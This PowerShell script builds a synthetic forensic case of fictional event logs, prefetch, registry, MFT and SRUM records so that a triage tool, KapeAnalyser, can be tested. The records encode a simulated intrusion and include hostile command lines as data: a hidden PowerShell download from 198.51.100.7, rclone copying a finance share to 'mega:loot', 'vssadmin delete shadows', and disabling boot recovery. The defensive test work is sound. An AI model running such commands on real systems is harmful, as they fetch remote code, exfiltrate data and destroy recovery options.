<#
.SYNOPSIS
  Builds a synthetic KAPE case (EZ Tools module output for three hosts) to test KapeAnalyser.

.DESCRIPTION
  Story: an attacker (203.0.113.45) brute-forces RDP on WS01, logs on as jdoe,
  runs mimikatz and rclone, creates a backdoor account, moves to FS01 with
  PsExec (admin share + PSEXESVC), deletes shadow copies and drops ransom
  notes, kerberoasts and runs DCSync against DC01, and uploads ~2 GB with
  rclone (SRUM). FS01 also has a webshell (w3wp.exe starting cmd.exe). All IPs are from
  documentation ranges; all names are fictional.

  Layout produced, as in a real case (ORC archives in Uploads\, extracted to
  Decompressed\, KAPE output in Processed\; KapeAnalyser writes to
  Processed\Level2\). Three different host-folder styles on purpose:
    <Case>\Uploads\                                            (empty here)
    <Case>\Decompressed\                                       (empty here)
    <Case>\Processed\WS01\EventLogs\...                        one folder per host
    <Case>\Processed\ORC_Server_FS01_20261101_120000\...       DFIR ORC archive name
    <Case>\Processed\DC01\2026-11-02T101010\EventLogs\...       KAPE timestamp folder
    <Case>\iocs.txt

.EXAMPLE
  .\tools\New-TestCase.ps1 -CaseFolder C:\Cases\KapeTest
#>
param([Parameter(Mandatory)] [string] $CaseFolder)

$ErrorActionPreference = 'Stop'
foreach ($d in 'Uploads', 'Decompressed') { New-Item -ItemType Directory -Force -Path (Join-Path $CaseFolder $d) | Out-Null }
$kape = Join-Path $CaseFolder 'Processed'   # KAPE's module output (its --mdest)
$ts = '20261101120000'

function New-Dir($p) { New-Item -ItemType Directory -Force -Path $p | Out-Null; $p }

function Write-Csv($rows, $path) {
    New-Dir (Split-Path $path) | Out-Null
    $rows | Export-Csv -Path $path -NoTypeInformation -Encoding UTF8
}

function T([datetime]$d) { $d.ToString('yyyy-MM-dd HH:mm:ss.fffffff') }

# ── EvtxECmd ─────────────────────────────────────────────────────────
$script:rec = 0
function Ev($time, $id, $channel, $provider, $computer, $data, $userData = $null, $map = '') {
    $script:rec++
    if ($userData) { $payload = @{ UserData = $userData } | ConvertTo-Json -Compress -Depth 6 }
    else {
        $items = @($data.GetEnumerator() | ForEach-Object { [ordered]@{ '@Name' = $_.Key; '#text' = [string]$_.Value } })
        $payload = @{ EventData = @{ Data = $items } } | ConvertTo-Json -Compress -Depth 6
    }
    $src = switch -Wildcard ($channel) {
        'Security' { 'C:\Windows\System32\winevt\Logs\Security.evtx' }
        'System' { 'C:\Windows\System32\winevt\Logs\System.evtx' }
        default { "C:\Windows\System32\winevt\Logs\$($channel -replace '/','%4').evtx" }
    }
    [pscustomobject][ordered]@{
        RecordNumber = $script:rec; EventRecordId = $script:rec; TimeCreated = (T $time); EventId = $id; Level = 'Info'
        Provider = $provider; Channel = $channel; ProcessId = 4; ThreadId = 8; Computer = $computer; ChunkNumber = 1
        UserId = ''; MapDescription = $map; UserName = ''; RemoteHost = ''; PayloadData1 = ''; PayloadData2 = ''; PayloadData3 = ''
        PayloadData4 = ''; PayloadData5 = ''; PayloadData6 = ''; ExecutableInfo = ''; HiddenRecord = 'False'; SourceFile = $src
        Keywords = ''; ExtraDataOffset = 0; Payload = $payload
    }
}
$SecProv = 'Microsoft-Windows-Security-Auditing'
function Logon($t, $comp, $user, $type, $ip, $ws) {
    Ev $t 4624 'Security' $SecProv $comp ([ordered]@{ SubjectUserSid = 'S-1-5-18'; TargetUserName = $user; TargetDomainName = 'CORP'
        LogonType = $type; LogonProcessName = 'NtLmSsp'; AuthenticationPackageName = 'NTLM'; WorkstationName = $ws; IpAddress = $ip; IpPort = '0' })
}

$d0 = [datetime]'2026-11-01 09:00:00'

# ── WS01 ─────────────────────────────────────────────────────────────
$ws = 'WS01.corp.local'
$ev = @()
# Background noise
1..20 | ForEach-Object { $ev += Logon $d0.AddMinutes(-600 + $_) $ws 'SYSTEM' '5' '-' '-' }
$ev += Logon $d0.AddHours(-12) $ws 'jdoe' '2' '127.0.0.1' 'WS01'
$ev += Ev $d0.AddHours(-11) 7045 'System' 'Service Control Manager' $ws ([ordered]@{ ServiceName = 'Google Update Service (gupdate)'; ImagePath = '"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc'; ServiceType = 'user mode service'; StartType = 'auto start'; AccountName = 'LocalSystem' })
# RDP brute force from the internet, then success
$users = 'administrator', 'admin', 'jdoe', 'test', 'scanner'
1..30 | ForEach-Object {
    $ev += Ev $d0.AddSeconds($_ * 7) 4625 'Security' $SecProv $ws ([ordered]@{ TargetUserName = $users[$_ % 5]; TargetDomainName = 'CORP'; Status = '0xc000006d'; FailureReason = '%%2313'; LogonType = '3'; WorkstationName = 'kali'; IpAddress = '203.0.113.45'; IpPort = '0' })
}
$tIn = $d0.AddMinutes(5)
$ev += Logon $tIn $ws 'jdoe' '10' '203.0.113.45' 'kali'
$ev += Ev $tIn.AddSeconds(-3) 1149 'Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational' 'Microsoft-Windows-TerminalServices-RemoteConnectionManager' $ws $null @{ EventXML = [ordered]@{ Param1 = 'jdoe'; Param2 = 'CORP'; Param3 = '203.0.113.45' } }
$ev += Ev $tIn.AddSeconds(2) 21 'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational' 'Microsoft-Windows-TerminalServices-LocalSessionManager' $ws $null @{ EventXML = [ordered]@{ User = 'CORP\jdoe'; SessionID = '2'; Address = '203.0.113.45' } }
# Execution
# Command lines are deliberately harmless (a real download cradle or
# credential-dumping command in this file gets it blocked by Defender/AMSI);
# they still exercise the same detections: encoded command, web download,
# a known tool by name, and a tool in a staging folder.
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Output 'kape analyser test'"))
$ev += Ev $tIn.AddMinutes(2) 4688 'Security' $SecProv $ws ([ordered]@{ SubjectUserName = 'jdoe'; NewProcessName = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; CommandLine = "powershell.exe -nop -w hidden -enc $enc"; ParentProcessName = 'C:\Windows\explorer.exe' })
$ev += Ev $tIn.AddMinutes(2).AddSeconds(1) 4104 'Microsoft-Windows-PowerShell/Operational' 'Microsoft-Windows-PowerShell' $ws ([ordered]@{ MessageNumber = '1'; MessageTotal = '1'; ScriptBlockText = "Invoke-WebRequest -Uri http://198.51.100.7/a.ps1 -OutFile C:\Users\Public\a.ps1"; ScriptBlockId = 'a1b2'; Path = '' })
$ev += Ev $tIn.AddMinutes(4) 4688 'Security' $SecProv $ws ([ordered]@{ SubjectUserName = 'jdoe'; NewProcessName = 'C:\Users\Public\mimikatz.exe'; CommandLine = 'mimikatz.exe exit'; ParentProcessName = 'C:\Windows\System32\cmd.exe' })
$ev += Ev $tIn.AddMinutes(5) 1116 'Microsoft-Windows-Windows Defender/Operational' 'Microsoft-Windows-Windows Defender' $ws ([ordered]@{ 'Threat Name' = 'HackTool:Win32/Mimikatz.D'; Path = 'file:_C:\Users\Public\m.exe'; 'Detection User' = 'CORP\jdoe'; 'Action Name' = 'Not Applicable' })
$ev += Ev $tIn.AddMinutes(6) 5007 'Microsoft-Windows-Windows Defender/Operational' 'Microsoft-Windows-Windows Defender' $ws ([ordered]@{ 'Old Value' = ''; 'New Value' = 'HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\Public = 0x0' })
$ev += Ev $tIn.AddMinutes(8) 4720 'Security' $SecProv $ws ([ordered]@{ TargetUserName = 'support'; TargetDomainName = 'WS01'; TargetSid = 'S-1-5-21-1-2-3-1009'; SubjectUserName = 'jdoe' })
$ev += Ev $tIn.AddMinutes(8).AddSeconds(5) 4732 'Security' $SecProv $ws ([ordered]@{ MemberName = '-'; MemberSid = 'S-1-5-21-1-2-3-1009'; TargetUserName = 'Administrators'; SubjectUserName = 'jdoe' })
$ev += Ev $tIn.AddMinutes(12) 4688 'Security' $SecProv $ws ([ordered]@{ SubjectUserName = 'jdoe'; NewProcessName = 'C:\PerfLogs\rclone.exe'; CommandLine = 'C:\PerfLogs\rclone.exe copy \\10.10.1.30\Finance mega:loot --transfers 8'; ParentProcessName = 'C:\Windows\System32\cmd.exe' })
$ev += Ev $tIn.AddMinutes(40) 1102 'Security' 'Microsoft-Windows-Eventlog' $ws $null @{ LogFileCleared = [ordered]@{ SubjectUserSid = 'S-1-5-21-1-2-3-1104'; SubjectUserName = 'jdoe'; SubjectDomainName = 'CORP' } }
Write-Csv $ev (Join-Path $kape "WS01\EventLogs\${ts}_EvtxECmd_Output.csv")

# Prefetch
$pf = @(
    [ordered]@{ ExecutableName = 'MIMIKATZ.EXE'; Path = '\VOLUME{01d0}\USERS\PUBLIC\MIMIKATZ.EXE'; Created = $tIn.AddMinutes(3) }
    [ordered]@{ ExecutableName = 'RCLONE.EXE'; Path = '\VOLUME{01d0}\PERFLOGS\RCLONE.EXE'; Created = $tIn.AddMinutes(12) }
    [ordered]@{ ExecutableName = 'ADVANCED_IP_SCANNER.EXE'; Path = '\VOLUME{01d0}\USERS\JDOE\DOWNLOADS\ADVANCED_IP_SCANNER.EXE'; Created = $tIn.AddMinutes(10) }
    [ordered]@{ ExecutableName = 'CHROME.EXE'; Path = '\VOLUME{01d0}\PROGRAM FILES\GOOGLE\CHROME\APPLICATION\CHROME.EXE'; Created = $d0.AddDays(-30) }
) | ForEach-Object {
    [pscustomobject][ordered]@{ Note = ''; SourceFilename = "C:\Windows\prefetch\$($_.ExecutableName)-1A2B3C4D.pf"; SourceCreated = (T $_.Created); SourceModified = (T $_.Created)
        SourceAccessed = (T $_.Created); ExecutableName = $_.ExecutableName; Hash = '1A2B3C4D'; Size = 12345; Version = 'Windows 10 or Windows 11'; RunCount = 1
        LastRun = (T $_.Created); PreviousRun0 = ''; PreviousRun1 = ''; PreviousRun2 = ''; PreviousRun3 = ''; PreviousRun4 = ''; PreviousRun5 = ''; PreviousRun6 = ''
        Volume0Name = '\VOLUME{01d0}'; Volume0Serial = 'ABCD1234'; Volume0Created = ''; Directories = ''; FilesLoaded = "\VOLUME{01d0}\WINDOWS\SYSTEM32\NTDLL.DLL, $($_.Path)"; ParsingError = 'False' }
}
Write-Csv $pf (Join-Path $kape "WS01\ProgramExecution\${ts}_PECmd_Output.csv")

# Amcache
$am = @(
    [pscustomobject][ordered]@{ ProgramName = 'Unassociated'; ProgramID = ''; VolumeID = ''; VolumeIDLastWriteTimestamp = ''; FileID = ''; FileIDLastWriteTimestamp = (T $tIn.AddMinutes(12)); SHA1 = '0000d2c5a7e4a1d6b5f0c3e8b9a7f6e5d4c3b2a1f0e9'; FullPath = 'c:\perflogs\rclone.exe'; FileExtension = '.exe'; MFTEntryNumber = ''; MFTSequenceNumber = ''; FileSize = 52000000; FileVersionString = ''; FileVersionNumber = ''; FileDescription = ''; SizeOfImage = ''; PEHeaderHash = ''; PEHeaderChecksum = ''; BinProductVersion = ''; BinFileVersion = ''; LinkerVersion = ''; BinaryType = ''; IsLocal = ''; GuessProgramID = ''; Created = ''; LastModified = ''; LastModifiedStore = ''; LinkDate = '2024-01-01 00:00:00'; LanguageId = ''; IsOsComponent = 'False'; ProductName = 'Rclone'; Name = 'rclone.exe'; FileKeyLastWriteTimestamp = (T $tIn.AddMinutes(12)) }
    [pscustomobject][ordered]@{ ProgramName = 'Unassociated'; ProgramID = ''; VolumeID = ''; VolumeIDLastWriteTimestamp = ''; FileID = ''; FileIDLastWriteTimestamp = (T $d0.AddDays(-30)); SHA1 = '00001111111111111111111111111111111111111111'; FullPath = 'c:\program files\google\chrome\application\chrome.exe'; FileExtension = '.exe'; MFTEntryNumber = ''; MFTSequenceNumber = ''; FileSize = 2000000; FileVersionString = ''; FileVersionNumber = ''; FileDescription = ''; SizeOfImage = ''; PEHeaderHash = ''; PEHeaderChecksum = ''; BinProductVersion = ''; BinFileVersion = ''; LinkerVersion = ''; BinaryType = ''; IsLocal = ''; GuessProgramID = ''; Created = ''; LastModified = ''; LastModifiedStore = ''; LinkDate = ''; LanguageId = ''; IsOsComponent = 'False'; ProductName = 'Google Chrome'; Name = 'chrome.exe'; FileKeyLastWriteTimestamp = (T $d0.AddDays(-30)) }
)
Write-Csv $am (Join-Path $kape "WS01\ProgramExecution\${ts}_Amcache_UnassociatedFileEntries.csv")

# AppCompatCache
Write-Csv @(
    [pscustomobject][ordered]@{ ControlSet = 1; CacheEntryPosition = 0; Path = 'C:\Users\Public\m.exe'; LastModifiedTimeUTC = (T $tIn.AddMinutes(3)); Executed = 'NA'; Duplicate = 'False'; SourceFile = 'C:\Windows\System32\config\SYSTEM' }
    [pscustomobject][ordered]@{ ControlSet = 1; CacheEntryPosition = 1; Path = 'C:\Windows\System32\notepad.exe'; LastModifiedTimeUTC = (T $d0.AddDays(-100)); Executed = 'NA'; Duplicate = 'False'; SourceFile = 'C:\Windows\System32\config\SYSTEM' }
) (Join-Path $kape "WS01\ProgramExecution\${ts}_Windows10Creators_SYSTEM_AppCompatCache.csv")

# RECmd batch
function Reg($hive, $cat, $desc, $key, $name, $data, $t) {
    [pscustomobject][ordered]@{ HivePath = $hive; HiveType = ''; Description = $desc; Category = $cat; KeyPath = $key; ValueName = $name; ValueType = 'RegSz'
        ValueData = $data; ValueData2 = ''; ValueData3 = ''; Comment = ''; Recursive = 'False'; Deleted = 'False'; LastWriteTimestamp = (T $t); PluginDetailFile = '' }
}
Write-Csv @(
    Reg 'C:\Windows\System32\config\SYSTEM' 'System Info' 'ComputerName' 'ControlSet001\Control\ComputerName\ComputerName' 'ComputerName' 'WS01' $d0.AddDays(-200)
    Reg 'C:\Windows\System32\config\SYSTEM' 'Network' 'Interfaces' 'ControlSet001\Services\Tcpip\Parameters\Interfaces\{a1}' 'DhcpIPAddress' '10.10.1.21' $d0.AddDays(-1)
    Reg 'C:\Users\jdoe\NTUSER.DAT' 'Autoruns' 'Run' 'Software\Microsoft\Windows\CurrentVersion\Run' 'OneDrive' '"C:\Users\jdoe\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background' $d0.AddDays(-50)
    Reg 'C:\Users\jdoe\NTUSER.DAT' 'Autoruns' 'Run' 'Software\Microsoft\Windows\CurrentVersion\Run' 'Updater' 'C:\Users\Public\svchost.exe -k netsvc' $tIn.AddMinutes(9)
    Reg 'C:\Windows\System32\config\SOFTWARE' 'Antivirus' 'Defender exclusions' 'Microsoft\Windows Defender\Exclusions\Paths' 'C:\Users\Public' '0' $tIn.AddMinutes(6)
    Reg 'C:\Users\jdoe\NTUSER.DAT' 'Program Execution' 'UserAssist' 'Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD}\Count' 'C:\Users\jdoe\Downloads\advanced_ip_scanner.exe' 'Run count: 1' $tIn.AddMinutes(10)
) (Join-Path $kape "WS01\Registry\${ts}_RECmd_Batch_Kroll_Batch_Output.csv")

# LECmd
function Lnk($src, $t, $local, $net, $common, $arguments, $drive, $label) {
    [pscustomobject][ordered]@{ SourceFile = $src; SourceCreated = (T $t); SourceModified = (T $t); SourceAccessed = (T $t); TargetCreated = ''; TargetModified = ''; TargetAccessed = ''
        FileSize = 0; RelativePath = ''; WorkingDirectory = ''; FileAttributes = ''; HeaderFlags = ''; DriveType = $drive; VolumeSerialNumber = 'ABCD'; VolumeLabel = $label
        LocalPath = $local; NetworkPath = $net; CommonPath = $common; Arguments = $arguments; TargetIDAbsolutePath = ''; MachineID = 'ws01' }
}
Write-Csv @(
    Lnk 'C:\Users\jdoe\AppData\Roaming\Microsoft\Windows\Recent\Q3 budget.xlsx.lnk' $tIn.AddMinutes(20) '' '\\10.10.1.30\C$' 'Finance\Q3 budget.xlsx' '' 'Fixed storage media (Hard Drive)' ''
    Lnk 'C:\Users\jdoe\Desktop\Invoice.lnk' $d0.AddHours(-2) 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' '' '' "-nop -w hidden -c Invoke-WebRequest http://198.51.100.7/a.ps1" 'Fixed storage media (Hard Drive)' ''
    Lnk 'C:\Users\jdoe\AppData\Roaming\Microsoft\Windows\Recent\report.docx.lnk' $d0.AddDays(-3) 'E:\report.docx' '' '' '' 'Removable storage media (Floppy, USB)' 'KINGSTON'
) (Join-Path $kape "WS01\FileFolderAccess\${ts}_LECmd_Output.csv")

# $MFT
function Mft($parent, $name, $size, $created, $inUse = 'True', $siFn = 'False', $zone = '', $createdFn = $null) {
    if (-not $createdFn) { $createdFn = $created }
    [pscustomobject][ordered]@{ EntryNumber = 1; SequenceNumber = 1; InUse = $inUse; ParentEntryNumber = 5; ParentSequenceNumber = 5; ParentPath = $parent; FileName = $name
        Extension = [IO.Path]::GetExtension($name); FileSize = $size; ReferenceCount = 1; ReparseTarget = ''; IsDirectory = 'False'; HasAds = 'False'; IsAds = 'False'
        'SI<FN' = $siFn; uSecZeros = 'False'; Copied = 'False'; SiFlags = 'Archive'; NameType = 'Windows'; Created0x10 = (T $created); Created0x30 = (T $createdFn)
        LastModified0x10 = (T $created); LastModified0x30 = ''; LastRecordChange0x10 = ''; LastRecordChange0x30 = ''; LastAccess0x10 = ''; LastAccess0x30 = ''
        UpdateSequenceNumber = 0; LogfileSequenceNumber = 0; SecurityId = 0; ObjectIdFileDroid = ''; LoggedUtilStream = ''; ZoneIdContents = $zone }
}
Write-Csv @(
    Mft '.\Users\Public' 'm.exe' 1250000 $tIn.AddMinutes(3)
    Mft '.\Users\Public' 'svchost.exe' 80000 $tIn.AddMinutes(9)
    Mft '.\PerfLogs' 'rclone.exe' 52000000 $tIn.AddMinutes(11)
    Mft '.\Users\Public' 'Finance.7z' 2400000000 $tIn.AddMinutes(30)
    Mft '.\ProgramData\Intel' 'wdsvc.dll' 120000 ([datetime]'2019-03-01 10:00:00') 'True' 'True' '' $tIn.AddMinutes(9)
    Mft '.\Users\jdoe\Downloads' 'advanced_ip_scanner.exe' 20000000 $tIn.AddMinutes(9) 'False' 'False' "[ZoneTransfer]`r`nZoneId=3`r`nHostUrl=https://download.example/advanced_ip_scanner.exe"
    Mft '.\Windows\System32' 'notepad.exe' 200000 $d0.AddDays(-300)
    Mft '.\Program Files\Google\Chrome\Application' 'chrome.exe' 2000000 $d0.AddDays(-30)
) (Join-Path $kape "WS01\FileSystem\${ts}_MFTECmd_`$MFT_Output.csv")

# $J
function Usn($name, $t, $reasons, $parent = '') {
    [pscustomobject][ordered]@{ Name = $name; Extension = [IO.Path]::GetExtension($name); EntryNumber = 1; SequenceNumber = 1; ParentEntryNumber = 5; ParentSequenceNumber = 5
        ParentPath = $parent; UpdateSequenceNumber = 1; UpdateTimestamp = (T $t); UpdateReasons = $reasons; FileAttributes = 'Archive'; OffsetToData = 0; SourceFile = 'C:\$Extend\$J' }
}
Write-Csv @(
    Usn 'mimikatz.exe' $tIn.AddMinutes(3) 'FileCreate'
    Usn 'MIMIKATZ.EXE-1A2B3C4D.pf' $tIn.AddMinutes(4) 'FileCreate'
    Usn 'mimikatz.exe' $tIn.AddMinutes(39) 'FileDelete|Close'
    Usn 'report.docx' $tIn.AddMinutes(1) 'FileCreate'
) (Join-Path $kape "WS01\FileSystem\${ts}_MFTECmd_`$J_Output.csv")

# RBCmd
Write-Csv @(
    [pscustomobject][ordered]@{ SourceName = 'C:\$Recycle.Bin\S-1-5-21-1-2-3-1104\$I1A2B3C.exe'; FileType = '$I'; FileName = 'C:\Users\jdoe\Downloads\advanced_ip_scanner.exe'; FileSize = 20000000; DeletedOn = (T $tIn.AddMinutes(38)) }
) (Join-Path $kape "WS01\FileDeletion\${ts}_RBCmd_Output.csv")

# SrumECmd: rclone uploads ~2 GB over two hours; normal apps for contrast
function Srum($t, $exe, $user, $recv, $sent) {
    [pscustomobject][ordered]@{ Id = 0; Timestamp = $t.ToString('yyyy-MM-dd HH:mm:ss'); ExeInfo = $exe; ExeInfoDescription = ''; ExeTimestamp = ''
        SidType = 'LocalUser'; Sid = 'S-1-5-21-1-2-3-1104'; UserName = $user; UserId = 1; AppId = 1; BytesReceived = $recv; BytesSent = $sent
        InterfaceLuid = '1689399632855040'; InterfaceType = 'IF_TYPE_ETHERNET_CSMACD'; L2ProfileFlags = 0; L2ProfileId = 0; ProfileName = '' }
}
$hour = [datetime]'2026-11-01 09:00:00'
Write-Csv @(
    Srum $hour '\device\harddiskvolume3\perflogs\rclone.exe' 'CORP\jdoe' 3145728 1288490188
    Srum $hour.AddHours(1) '\device\harddiskvolume3\perflogs\rclone.exe' 'CORP\jdoe' 1048576 966367641
    Srum $hour '\device\harddiskvolume3\program files\google\chrome\application\chrome.exe' 'CORP\jdoe' 52428800 2097152
    Srum $hour '\device\harddiskvolume3\users\jdoe\appdata\local\microsoft\onedrive\onedrive.exe' 'CORP\jdoe' 1048576 734003200
    Srum $hour 'svchost.exe [wuauserv]' 'SYSTEM' 209715200 1048576
) (Join-Path $kape "WS01\SRUMDatabase\${ts}_SrumECmd_NetworkUsages_Output.csv")
Write-Csv @(
    [pscustomobject][ordered]@{ Id = 0; Timestamp = $hour.ToString('yyyy-MM-dd HH:mm:ss'); ExeInfo = '\device\harddiskvolume3\perflogs\rclone.exe'; ExeInfoDescription = ''; ExeTimestamp = ''
        SidType = 'LocalUser'; Sid = 'S-1-5-21-1-2-3-1104'; UserName = 'CORP\jdoe'; UserId = 1; AppId = 1; BackgroundBytesRead = 0; BackgroundBytesWritten = 0
        BackgroundCycleTime = 0; FaceTime = 0; ForegroundBytesRead = 2254857830; ForegroundBytesWritten = 0; ForegroundCycleTime = 912345678 }
) (Join-Path $kape "WS01\SRUMDatabase\${ts}_SrumECmd_AppResourceUseInfo_Output.csv")

# ── FS01 (ORC-style folder name) ─────────────────────────────────────
$fsRoot = Join-Path $kape 'ORC_Server_FS01_20261101_120000'
$fs = 'FS01.corp.local'
$ev = @()
1..10 | ForEach-Object { $ev += Logon $d0.AddHours(-5).AddMinutes($_) $fs 'svc_backup' '3' '10.10.1.5' 'BACKUP01' }
$tL = $tIn.AddMinutes(25)
$ev += Logon $tL $fs 'jdoe' '3' '10.10.1.21' 'WS01'
$ev += Ev $tL.AddSeconds(2) 5145 'Security' $SecProv $fs ([ordered]@{ SubjectUserName = 'jdoe'; SubjectDomainName = 'CORP'; IpAddress = '10.10.1.21'; ShareName = '\\*\ADMIN$'; RelativeTargetName = 'PSEXESVC.exe' })
$ev += Ev $tL.AddSeconds(4) 7045 'System' 'Service Control Manager' $fs ([ordered]@{ ServiceName = 'PSEXESVC'; ImagePath = '%SystemRoot%\PSEXESVC.exe'; ServiceType = 'user mode service'; StartType = 'demand start'; AccountName = 'LocalSystem' })
$ev += Ev $tL.AddMinutes(1) 4688 'Security' $SecProv $fs ([ordered]@{ SubjectUserName = 'jdoe'; NewProcessName = 'C:\Windows\System32\vssadmin.exe'; CommandLine = 'vssadmin.exe delete shadows /all /quiet'; ParentProcessName = 'C:\Windows\PSEXESVC.exe' })
$ev += Ev $tL.AddMinutes(2) 4688 'Security' $SecProv $fs ([ordered]@{ SubjectUserName = 'jdoe'; NewProcessName = 'C:\Windows\System32\bcdedit.exe'; CommandLine = 'bcdedit /set {default} recoveryenabled No'; ParentProcessName = 'C:\Windows\PSEXESVC.exe' })
# Webshell on FS01's intranet site: IIS worker runs recon commands
$ev += Ev $d0.AddMinutes(-30) 4688 'Security' $SecProv $fs ([ordered]@{ SubjectUserName = 'FS01$'; NewProcessName = 'C:\Windows\System32\cmd.exe'; CommandLine = 'cmd.exe /c whoami'; ParentProcessName = 'C:\Windows\System32\inetsrv\w3wp.exe' })
Write-Csv $ev (Join-Path $fsRoot "EventLogs\${ts}_EvtxECmd_Output.csv")
$mft = @()
1..25 | ForEach-Object { $mft += Mft ".\Shares\Finance\Dept$_" 'README_RESTORE_FILES.txt' 1200 $tL.AddMinutes(5).AddSeconds($_) }
$mft += Mft '.\Windows' 'PSEXESVC.exe' 180000 $tL.AddSeconds(3)
Write-Csv $mft (Join-Path $fsRoot "FileSystem\${ts}_MFTECmd_`$MFT_Output.csv")

# ── DC01 (KAPE timestamp folder) ─────────────────────────────────────
$dcRoot = Join-Path $kape 'DC01\2026-11-02T101010'
$dc = 'DC01.corp.local'
$ev = @()
$ev += Logon $tIn.AddMinutes(15) $dc 'jdoe' '3' '10.10.1.21' 'WS01'
1..12 | ForEach-Object {
    $ev += Ev $tIn.AddMinutes(16).AddSeconds($_) 4769 'Security' $SecProv $dc ([ordered]@{ TargetUserName = 'jdoe@CORP.LOCAL'; ServiceName = "svc_app$_"; TicketEncryptionType = '0x17'; IpAddress = '::ffff:10.10.1.21'; Status = '0x0' })
}
$ev += Ev $tIn.AddMinutes(18) 4728 'Security' $SecProv $dc ([ordered]@{ MemberName = 'CN=support,CN=Users,DC=corp,DC=local'; MemberSid = 'S-1-5-21-1-2-3-1110'; TargetUserName = 'Domain Admins'; SubjectUserName = 'jdoe' })
# DCSync from jdoe (replication rights), and a computer account created by a user
$ev += Ev $tIn.AddMinutes(20) 4662 'Security' $SecProv $dc ([ordered]@{ SubjectUserName = 'jdoe'; SubjectDomainName = 'CORP'; ObjectServer = 'DS'; ObjectType = '%{19195a5b-6da0-11d0-afd3-00c04fd930c9}'; AccessMask = '0x100'; Properties = '%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} {19195a5b-6da0-11d0-afd3-00c04fd930c9}' })
$ev += Ev $tIn.AddMinutes(21) 4741 'Security' $SecProv $dc ([ordered]@{ TargetUserName = 'EVILPC$'; TargetDomainName = 'CORP'; SubjectUserName = 'jdoe'; SubjectDomainName = 'CORP' })
Write-Csv $ev (Join-Path $dcRoot "EventLogs\${ts}_EvtxECmd_Output.csv")

# ── Case IOC list ────────────────────────────────────────────────────
@'
# IOCs from the ticket (defanged on purpose)
203.0.113[.]45 # RDP brute force source
hxxp://198.51.100[.]7/a.ps1
d2c5a7e4a1d6b5f0c3e8b9a7f6e5d4c3b2a1f0e9 # rclone.exe
file:m.exe
user:support
'@ | Set-Content -Path (Join-Path $CaseFolder 'iocs.txt') -Encoding UTF8

Write-Host "Test case written to $CaseFolder"
